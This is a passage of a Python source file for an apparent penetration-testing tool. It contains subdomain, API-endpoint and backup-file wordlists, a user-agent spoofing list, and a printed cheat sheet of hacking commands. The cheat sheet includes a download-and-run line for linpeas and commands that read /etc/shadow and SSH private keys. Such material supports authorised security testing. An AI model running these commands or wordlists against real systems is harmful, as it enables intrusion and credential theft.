    "data","database","db","db1","db2","db3","db4","db5","db6",
    "dbadmin","dbmaster","dbslave","dbreplica","dbbackup","dbdev",
    "debug","deploy","deployment","dev","dev1","dev2","dev3",
    "dev4","dev5","develop","developer","developers","development",
    "devops","devapi","devcms","devdb","devstage","devtest",
    "dm","docs","doc","document","documents","download","downloads",
    "drone","email","emails","engine","enterprise","erp","event",
    "events","exchange","experiment","export","extranet",
    "feedback","file","files","finance","firewall","forum","forums",
    "ftp","ftp1","ftp2","ftp3","ftps","ftpdev","ftpprod",
    "gateway","geoip","git","github","gitlab","go","graph",
    "graphql","grpc","guardian","guest","guide","guides",
    "healthz","health","help","hidden","home","host","hosting",
    "hub","hydra","images","img","import","infra","infrastructure",
    "insight","insights","install","internal","intranet","jabber",
    "jenkins","jira","k8s","kafka","kibana","kubernetes","lab",
    "labs","lb","ldap","legacy","lib","library","live","load",
    "local","log","logdev","logger","logging","logstash","logs",
    "mail","mail1","mail2","mail3","mail4","mail5","mail6",
    "maildev","mailstage","mailprod","mailtest","mailbackup",
    "mailadmin","mailserver","mailrelay","mailfilter","mailout",
    "maintenence","manage","management","manager","media","metrics",
    "mobileapi","monitor","monitoring","mysql","nagios","net",
    "new","new-api","newsletter","nginx","node","nodes",
    "notification","notifications","ns","ns1","ns2","ns3","ns4",
    "oc","oci","old","openvpn","otp","p","panel","partners",
    "pentest","ping","pm","pop","pop3","portal","preprod",
    "private","priv","prod","prod1","prod2","prod3","prod4","prod5",
    "production","profile","prometheus","proxy","queue","rabbitmq",
    "rancher","rdp","redis","repo","reports","rest","rollout",
    "route","router","rss","rtmp","s3","sandbox","search","secret",
    "security","server","service","services","sftp","sip","smtp",
    "smtp1","smtp2","smtp3","smtprelay","smtpout","smtpauth",
    "social","solr","spf","sql","ssh","ssl","sso","stage",
    "stage1","stage2","stage3","stage4","stage5","staging",
    "staging1","staging2","staging3","staging4","staging5",
    "status","static","storage","support","svn","sys","syslog",
    "teleport","telemetry","test","test1","test2","test3",
    "test4","test5","testdev","teststage","testprod","testapi",
    "testapp","testenv","testdb","testmail","testadmin",
    "ticket","tools","traefik","tracking","tx","uat","upload",
    "uploads","vault","video","vpn","vpn1","vpn2","vpn3",
    "wap","web","web1","web2","web3","web4","web5","webapi",
    "webdev","webhook","webhooks","webmail","websocket","wiki",
    "worker","www","www1","www2","www3","www4","www5","www6",
    "xmpp","zone","zookeeper",
]

                                                                                 
                                                       
                                                                                 

EXTENDED_REST_API_ENDPOINTS = [
    "/api/v1/users",
    "/api/v1/user",
    "/api/v1/user/{id}",
    "/api/v1/users/{id}",
    "/api/v1/users/{id}/profile",
    "/api/v1/users/{id}/settings",
    "/api/v1/users/{id}/roles",
    "/api/v1/users/{id}/permissions",
    "/api/v1/users/{id}/sessions",
    "/api/v1/users/{id}/tokens",
    "/api/v1/users/{id}/avatar",
    "/api/v1/users/{id}/email",
    "/api/v1/users/{id}/password",
    "/api/v1/users/{id}/2fa",
    "/api/v1/users/{id}/activity",
    "/api/v1/users/{id}/notifications",
    "/api/v1/users/{id}/subscriptions",
    "/api/v1/users/{id}/invoices",
    "/api/v1/users/{id}/orders",
    "/api/v1/users/{id}/payments",
    "/api/v1/users/me",
    "/api/v1/users/current",
    "/api/v1/users/search",
    "/api/v1/users/export",
    "/api/v1/users/import",
    "/api/v1/users/bulk",
    "/api/v1/users/count",
    "/api/v1/users/list",
    "/api/v1/auth",
    "/api/v1/auth/login",
    "/api/v1/auth/logout",
    "/api/v1/auth/register",
    "/api/v1/auth/refresh",
    "/api/v1/auth/token",
    "/api/v1/auth/revoke",
    "/api/v1/auth/verify",
    "/api/v1/auth/confirm",
    "/api/v1/auth/reset",
    "/api/v1/auth/forgot",
    "/api/v1/auth/2fa",
    "/api/v1/auth/2fa/setup",
    "/api/v1/auth/2fa/verify",
    "/api/v1/auth/2fa/disable",
    "/api/v1/auth/oauth",
    "/api/v1/auth/oauth/google",
    "/api/v1/auth/oauth/github",
    "/api/v1/auth/oauth/facebook",
    "/api/v1/auth/oauth/twitter",
    "/api/v1/auth/oauth/apple",
    "/api/v1/auth/oauth/microsoft",
    "/api/v1/auth/oauth/slack",
    "/api/v1/auth/saml",
    "/api/v1/auth/sso",
    "/api/v1/auth/jwt",
    "/api/v1/auth/apikey",
    "/api/v1/auth/session",
    "/api/v1/accounts",
    "/api/v1/accounts/{id}",
    "/api/v1/accounts/{id}/users",
    "/api/v1/accounts/{id}/billing",
    "/api/v1/accounts/{id}/settings",
    "/api/v1/accounts/{id}/subscription",
    "/api/v1/accounts/{id}/invoices",
    "/api/v1/accounts/{id}/usage",
    "/api/v1/accounts/{id}/limits",
    "/api/v1/accounts/current",
    "/api/v1/accounts/me",
    "/api/v1/admin",
    "/api/v1/admin/users",
    "/api/v1/admin/users/{id}",
    "/api/v1/admin/users/{id}/ban",
    "/api/v1/admin/users/{id}/unban",
    "/api/v1/admin/users/{id}/delete",
    "/api/v1/admin/users/{id}/promote",
    "/api/v1/admin/users/{id}/demote",
    "/api/v1/admin/users/{id}/impersonate",
    "/api/v1/admin/users/{id}/reset-password",
    "/api/v1/admin/users/{id}/verify-email",
    "/api/v1/admin/config",
    "/api/v1/admin/settings",
    "/api/v1/admin/flags",
    "/api/v1/admin/stats",
    "/api/v1/admin/metrics",
    "/api/v1/admin/logs",
    "/api/v1/admin/audit",
    "/api/v1/admin/backup",
    "/api/v1/admin/restore",
    "/api/v1/admin/maintenance",
    "/api/v1/admin/cache",
    "/api/v1/admin/clear-cache",
    "/api/v1/admin/jobs",
    "/api/v1/admin/queues",
    "/api/v1/admin/workers",
    "/api/v1/admin/notifications",
    "/api/v1/admin/announcements",
    "/api/v1/admin/migrations",
    "/api/v1/admin/seed",
    "/api/v1/admin/reset",
    "/api/v1/admin/export",
    "/api/v1/admin/import",
    "/api/v1/admin/reports",
    "/api/v1/admin/dashboard",
    "/api/v1/admin/analytics",
    "/api/v1/admin/system",
    "/api/v1/admin/health",
    "/api/v1/admin/version",
    "/api/v1/admin/env",
    "/api/v1/admin/debug",
    "/api/v1/admin/test",
    "/api/v1/admin/ping",
    "/api/v1/admin/info",
    "/api/v1/admin/profile",
    "/api/v1/admin/roles",
    "/api/v1/admin/permissions",
    "/api/v1/admin/invites",
    "/api/v1/admin/sessions",
    "/api/v1/admin/tokens",
    "/api/v1/admin/api-keys",
    "/api/v1/admin/webhooks",
    "/api/v1/admin/integrations",
    "/api/v1/admin/extensions",
    "/api/v1/admin/plugins",
    "/api/v1/admin/themes",
    "/api/v1/admin/media",
    "/api/v1/admin/files",
    "/api/v1/admin/storage",
    "/api/v1/admin/subscriptions",
    "/api/v1/admin/plans",
    "/api/v1/admin/billing",
    "/api/v1/admin/invoices",
    "/api/v1/admin/payments",
    "/api/v1/admin/transactions",
    "/api/v1/admin/coupons",
    "/api/v1/admin/discounts",
    "/api/v1/admin/products",
    "/api/v1/admin/orders",
    "/api/v1/admin/customers",
    "/api/v1/admin/reviews",
    "/api/v1/admin/categories",
    "/api/v1/admin/tags",
    "/api/v1/admin/comments",
    "/api/v1/admin/posts",
    "/api/v1/admin/pages",
    "/api/v1/admin/articles",
    "/api/v1/admin/newsletters",
    "/api/v1/admin/campaigns",
    "/api/v1/admin/templates",
    "/api/v1/admin/emails",
    "/api/v1/admin/sms",
    "/api/v1/admin/push",
    "/api/v1/admin/chat",
    "/api/v1/admin/messages",
    "/api/v1/admin/groups",
    "/api/v1/admin/teams",
    "/api/v1/admin/projects",
    "/api/v1/admin/tasks",
    "/api/v1/admin/events",
    "/api/v1/admin/calendar",
    "/api/v1/admin/documents",
    "/api/v1/admin/forms",
    "/api/v1/admin/surveys",
    "/api/v1/admin/feedback",
    "/api/v1/admin/support",
    "/api/v1/admin/tickets",
    "/api/v1/products",
    "/api/v1/products/{id}",
    "/api/v1/products/{id}/reviews",
    "/api/v1/products/{id}/variants",
    "/api/v1/products/{id}/images",
    "/api/v1/products/{id}/related",
    "/api/v1/products/search",
    "/api/v1/products/featured",
    "/api/v1/products/popular",
    "/api/v1/products/new",
    "/api/v1/products/sale",
    "/api/v1/products/categories",
    "/api/v1/orders",
    "/api/v1/orders/{id}",
    "/api/v1/orders/{id}/items",
    "/api/v1/orders/{id}/status",
    "/api/v1/orders/{id}/track",
    "/api/v1/orders/{id}/cancel",
    "/api/v1/orders/{id}/refund",
    "/api/v1/orders/{id}/invoice",
    "/api/v1/orders/{id}/receipt",
    "/api/v1/orders/history",
    "/api/v1/cart",
    "/api/v1/cart/items",
    "/api/v1/cart/items/{id}",
    "/api/v1/cart/checkout",
    "/api/v1/cart/apply-coupon",
    "/api/v1/cart/remove-coupon",
    "/api/v1/cart/calculate",
    "/api/v1/cart/shipping",
    "/api/v1/cart/tax",
    "/api/v1/cart/clear",
    "/api/v1/payments",
    "/api/v1/payments/{id}",
    "/api/v1/payments/intent",
    "/api/v1/payments/confirm",
    "/api/v1/payments/cancel",
    "/api/v1/payments/refund",
    "/api/v1/payments/methods",
    "/api/v1/payments/methods/{id}",
    "/api/v1/payments/webhook",
    "/api/v1/payments/history",
    "/api/v1/subscriptions",
    "/api/v1/subscriptions/{id}",
    "/api/v1/subscriptions/{id}/cancel",
    "/api/v1/subscriptions/{id}/pause",
    "/api/v1/subscriptions/{id}/resume",
    "/api/v1/subscriptions/{id}/upgrade",
    "/api/v1/subscriptions/{id}/downgrade",
    "/api/v1/subscriptions/plans",
    "/api/v1/subscriptions/current",
    "/api/v1/files",
    "/api/v1/files/{id}",
    "/api/v1/files/upload",
    "/api/v1/files/download/{id}",
    "/api/v1/files/delete/{id}",
    "/api/v1/files/share/{id}",
    "/api/v1/files/bulk-delete",
    "/api/v1/media",
    "/api/v1/media/{id}",
    "/api/v1/media/upload",
    "/api/v1/media/images",
    "/api/v1/media/videos",
    "/api/v1/media/documents",
    "/api/v1/notifications",
    "/api/v1/notifications/{id}",
    "/api/v1/notifications/unread",
    "/api/v1/notifications/mark-read",
    "/api/v1/notifications/mark-all-read",
    "/api/v1/notifications/delete",
    "/api/v1/notifications/preferences",
    "/api/v1/notifications/subscribe",
    "/api/v1/notifications/unsubscribe",
    "/api/v1/search",
    "/api/v1/search/users",
    "/api/v1/search/products",
    "/api/v1/search/orders",
    "/api/v1/search/global",
    "/api/v1/search/autocomplete",
    "/api/v1/search/suggest",
    "/api/v1/analytics",
    "/api/v1/analytics/events",
    "/api/v1/analytics/pageviews",
    "/api/v1/analytics/sessions",
    "/api/v1/analytics/users",
    "/api/v1/analytics/revenue",
    "/api/v1/analytics/conversions",
    "/api/v1/analytics/funnel",
    "/api/v1/analytics/cohorts",
    "/api/v1/analytics/retention",
    "/api/v1/analytics/churn",
    "/api/v1/analytics/custom",
    "/api/v1/settings",
    "/api/v1/settings/general",
    "/api/v1/settings/security",
    "/api/v1/settings/notifications",
    "/api/v1/settings/billing",
    "/api/v1/settings/privacy",
    "/api/v1/settings/integrations",
    "/api/v1/settings/api-keys",
    "/api/v1/settings/webhooks",
    "/api/v1/settings/themes",
    "/api/v1/settings/languages",
    "/api/v1/settings/email",
    "/api/v1/settings/sms",
    "/api/v1/settings/payments",
    "/api/v1/settings/shipping",
    "/api/v1/settings/tax",
    "/api/v1/settings/seo",
    "/api/v1/settings/social",
    "/api/v1/settings/analytics",
    "/api/v1/settings/backup",
    "/api/v1/settings/maintenance",
    "/api/v1/settings/cache",
    "/api/v1/health",
    "/api/v1/healthz",
    "/api/v1/health/live",
    "/api/v1/health/ready",
    "/api/v1/health/startup",
    "/api/v1/health/db",
    "/api/v1/health/cache",
    "/api/v1/health/queue",
    "/api/v1/health/storage",
    "/api/v1/health/dependencies",
    "/api/v1/status",
    "/api/v1/ping",
    "/api/v1/version",
    "/api/v1/info",
    "/api/v1/metrics",
    "/api/v1/debug",
    "/api/v1/env",
    "/api/v1/config",
    "/api/v2/users",
    "/api/v2/auth",
    "/api/v2/auth/login",
    "/api/v2/auth/logout",
    "/api/v2/auth/refresh",
    "/api/v2/admin",
    "/api/v2/admin/users",
    "/api/v2/products",
    "/api/v2/orders",
    "/api/v2/payments",
    "/api/v2/settings",
    "/api/v2/health",
    "/api/v3/users",
    "/api/v3/auth",
    "/api/v3/admin",
    "/api/v3/products",
    "/api/v3/health",
    "/api/internal/users",
    "/api/internal/admin",
    "/api/internal/config",
    "/api/internal/debug",
    "/api/internal/metrics",
    "/api/private/users",
    "/api/private/admin",
    "/api/private/config",
    "/api/public/products",
    "/api/public/categories",
    "/api/public/search",
    "/api/public/health",
    "/rest/v1/users",
    "/rest/v1/admin",
    "/rest/v2/users",
    "/rest/v2/admin",
    "/graphql",
    "/graphql/v1",
    "/graphql/v2",
    "/graphiql",
    "/playground",
    "/api/graphql",
    "/api/v1/graphql",
    "/socket.io",
    "/ws",
    "/websocket",
    "/api/ws",
    "/api/websocket",
    "/api/events",
    "/api/sse",
    "/api/stream",
    "/api/realtime",
    "/api/live",
    "/api/push",
    "/api/poll",
    "/api/longpoll",
]

                                                                                 
                                                  
                                                                                 

EXTENDED_BACKUP_EXTENSIONS = [
    ".bak",".backup",".bk",".bkp",".old",".orig",".original",
    ".save",".saved",".copy",".cp",".tmp",".temp",".sw",".swp",
    ".swo",".~",".1",".2",".3",".0",".100",".001",".01",".02",
    ".20240101",".20240601",".2024",".2023",".2022",".2021",
    ".20230101",".20230601",".20221231",".20221201",
    ".log",".LOG",".log1",".log2",".txt",".TXT",".text",
    ".gz",".tar",".tar.gz",".tgz",".zip",".ZIP",".rar",".7z",
    ".tar.bz2",".tbz2",".tar.xz",".txz",".tar.zst",".tzst",
    "-bak","-backup","-bkp","-old","-orig","-copy","-tmp","-temp",
    "_bak","_backup","_bkp","_old","_orig","_copy","_tmp","_temp",
    "_save","_saved","_copy","_cp","_1","_2","_3","_v1","_v2",
    "_v1.0","_v2.0","_2024","_2023","_2022","_2021","_2020",
    "~","#","$","@",
    ".disabled",".off",".deactivated",".inactive","~old","~bak",
    ".dev",".development",".staging",".stage",".test",".prod",
    ".production",".live",".draft",".new",".latest",".current",
    ".previous",".last",".prev",".original",".initial",".base",
    ".dist",".sample",".example",".default",".reference","_ref",
    "_draft","_wip","_work","_todo","_fixme","_review","_merge",
    "-new","-latest","-current","-previous","-last","-prev",
    "-original","-initial","-base","-dist","-sample","-example",
    "-default","-reference",
    ".dump",".dmp",".export",".exported",".sql",".SQL",".sqlite",
    ".sqlite3",".db",".DB",".mdb",".accdb",".dbf",".csv",".CSV",
    ".json",".JSON",".xml",".XML",".yaml",".yml",".YAML",".YML",
    ".conf",".config",".cfg",".ini",".env",".properties",".props",
    ".toml",".hcl",".tf",".tfvars",
    ".php.bak",".php.old",".php.save",".php.orig",".php.swap",
    ".php.tmp",".php_",".php~",".php.1",".php.2",".php.3",
    ".asp.bak",".asp.old",".aspx.bak",".aspx.old",".aspx.save",
    ".jsp.bak",".jsp.old",".java.bak",".java.old",
    ".py.bak",".py.old",".py.save",".py.orig",".py.tmp",
    ".rb.bak",".rb.old",".go.bak",".go.old",
    ".js.bak",".js.old",".ts.bak",".ts.old",
    ".html.bak",".html.old",".htm.bak",".htm.old",
    ".css.bak",".css.old",".scss.bak",".less.bak",
    ".sh.bak",".sh.old",".bash.bak",".bash.old",
    ".pl.bak",".pl.old",".pm.bak",".pm.old",
    ".cgi.bak",".cgi.old",
    ".htaccess.bak",".htaccess.old",".htaccess.save",
    ".htpasswd.bak",".htpasswd.old",".htpasswd.save",
    ".htaccess~",".htpasswd~",
    "wp-config.php.bak","wp-config.php.old","wp-config.php.save",
    "wp-config.php.orig","wp-config.php.tmp","wp-config.php.~",
    "wp-config.bak","wp-config.old","wp-config.save",
    "config.php.bak","config.php.old","config.php.save",
    "settings.php.bak","settings.php.old","settings.php.save",
    "database.php.bak","database.php.old","database.php.save",
    "configuration.php.bak","configuration.php.old",
    ".git.bak",".git.zip",".git.tar.gz",".svn.bak",".svn.zip",
]

                                                                                 
                                                    
                                                                                 

PENTEST_CHEATSHEET = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                     SYKE PENTEST CHEAT SHEET                               ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ INFORMATION GATHERING                                                       ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ nmap -sV -sC -p- TARGET                  # full TCP + service version      ║
║ nmap -sU -top-ports 200 TARGET           # top UDP ports                   ║
║ nmap --script vuln TARGET                # NSE vuln scripts                ║
║ masscan -p0-65535 TARGET --rate=1000     # ultra-fast port scan            ║
║ dnsx -d TARGET -a -aaaa -cname -mx -txt  # DNS record enum                 ║
║ subfinder -d TARGET -silent -o subs.txt  # subdomain enum                  ║
║ amass enum -d TARGET -o amass.txt        # deep subdomain enum             ║
║ httpx -l subs.txt -mc 200,301,302,403    # probe alive hosts               ║
║ theHarvester -d TARGET -b all            # email/host/people enum          ║
║ shodan search hostname:TARGET            # Shodan query                    ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ WEB APPLICATION                                                             ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ whatweb TARGET                           # tech stack fingerprint           ║
║ nikto -h TARGET                          # legacy web scanner               ║
║ gobuster dir -u TARGET -w big.txt        # directory brute-force           ║
║ ffuf -w big.txt -u TARGET/FUZZ           # fast directory fuzzing          ║
║ ffuf -w params.txt -u TARGET?FUZZ=test   # param fuzzing                   ║
║ wfuzz -c -w wordlist -u TARGET/FUZZ      # wfuzz directory brute           ║
║ sqlmap -u "TARGET?id=1" --dbs            # SQL injection + DB enum         ║
║ sqlmap -u TARGET --forms --batch         # auto-detect forms               ║
║ nuclei -u TARGET -t ./templates/         # template-based scanning         ║
║ dalfox url TARGET                        # XSS scanning                    ║
║ XSStrike --url TARGET                    # XSS testing                     ║
║ corsy -i urls.txt -d TARGET              # CORS misconfiguration           ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ BURP SUITE QUICK TIPS                                                       ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ Proxy → Intercept → Forward/Drop         # intercept requests              ║
║ Repeater → Ctrl+R                        # send to repeater                ║
║ Scanner → Audit → Active                 # full vuln scan                  ║
║ Intruder → Sniper/Cluster → Payloads     # brute-force/fuzzing             ║
║ Comparer → Send two requests             # diff responses                  ║
║ Decoder → Ctrl+B = Base64 decode        # decode/encode data              ║
║ Logger → Filter → 2xx,3xx,4xx,5xx       # filter by status               ║
║ Target → Site map → Right-click → Scan  # scan in-scope items             ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ PRIVILEGE ESCALATION                                                        ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ sudo -l                                  # check sudo permissions          ║
║ find / -perm -4000 2>/dev/null           # find SUID binaries              ║
║ find / -perm -2000 2>/dev/null           # find SGID binaries              ║
║ find / -writable -type d 2>/dev/null     # find writable directories       ║
║ cat /etc/crontab                          # check scheduled tasks           ║
║ cat /etc/passwd | grep -v nologin        # find shell users                ║
║ cat /etc/shadow                           # crack password hashes           ║
║ ps aux | grep root                        # root processes                  ║
║ netstat -tlnp                             # listening ports                 ║
║ ss -tlnp                                  # socket statistics               ║
║ env                                        # environment variables           ║
║ cat /proc/self/environ                    # current env (LFI)              ║
║ wget linpeas.sh | bash                    # automated priv esc              ║
║ curl -L github.com/carlospolop/PEASS-ng  # download linpeas                ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ POST-EXPLOITATION                                                            ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ id; whoami; hostname                      # who am i?                       ║
║ uname -a; cat /etc/os-release            # system info                     ║
║ ip addr; route                            # network info                    ║
║ cat ~/.ssh/id_rsa                         # grab SSH key                    ║
║ find / -name "*.env" 2>/dev/null         # find .env files                 ║
║ find / -name "config.php" 2>/dev/null    # find config files               ║
║ find / -name "wp-config.php" 2>/dev/null # find WP config                  ║
║ grep -r "password" /var/www/html/        # grep for passwords              ║
║ grep -r "DB_PASS" /var/www/html/         # grep for DB passwords           ║
║ history; cat ~/.bash_history              # command history                 ║
║ crontab -l; cat /etc/crontab             # scheduled tasks                 ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""


def print_pentest_cheatsheet():
    _banner()
    print(BLU + PENTEST_CHEATSHEET + RST)
    _pause()


                                                                                 
                                                               
                                                                                 

USER_AGENTS_EXTENDED = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.2; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Samsung Galaxy S23) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Samsung Galaxy S22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/109.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/109.0.0.0",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/W.X.Y.Z Safari/537.36",
    "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp",
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
    "Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp",
    "ia_archiver (+http://www.alexa.com/site/help/webmasters; crawler@alexa.com)",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Twitterbot/1.0",
    "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)",
    "WhatsApp/2.21.171.10 A",
    "TelegramBot (like TwitterBot)",
    "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
    "Discordbot/2.0 (+https://discordapp.com)",
    "curl/7.88.1",
    "curl/8.4.0",
    "curl/8.6.0",
    "curl/8.7.1",
    "Wget/1.21.4",
    "Python-urllib/3.11",
    "Python-requests/2.31.0",
    "Go-http-client/1.1",
    "Go-http-client/2.0",
    "Java/17.0.9",
    "Java/11.0.21",
    "Apache-HttpClient/4.5.14",
    "Apache-HttpClient/5.3",
    "okhttp/4.12.0",
    "axios/1.6.8",
    "node-fetch/3.3.2",
    "got/12.6.1",
    "libwww-perl/6.77",
    "Ruby/3.3.0",
    "Faraday/2.9.0",
    "HTTPie/3.2.2",
    "insomnia/9.1.0",
    "PostmanRuntime/7.37.0",
    "PostmanRuntime/7.36.0",
    "PostmanRuntime/7.35.0",
    "Googlebot-Image/1.0",
    "Googlebot-News",
    "Googlebot-Video/1.0",
    "AdsBot-Google (+http://www.google.com/adsbot.html)",
    "APIs-Google (+https://developers.google.com/webmasters/APIs-Google.html)",
    "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)",
    "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot)",
    "rogerbot/1.0 (http://moz.com/help/pro/what-is-rogerbot-+)",
    "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; Sogou spider/3.0; +http://www.sogou.com/docs/help/webmasters.htm)",
    "Mozilla/5.0 (compatible; Konqueror/4.0; MSIE 6.0; Windows NT 5.1)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
    "Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
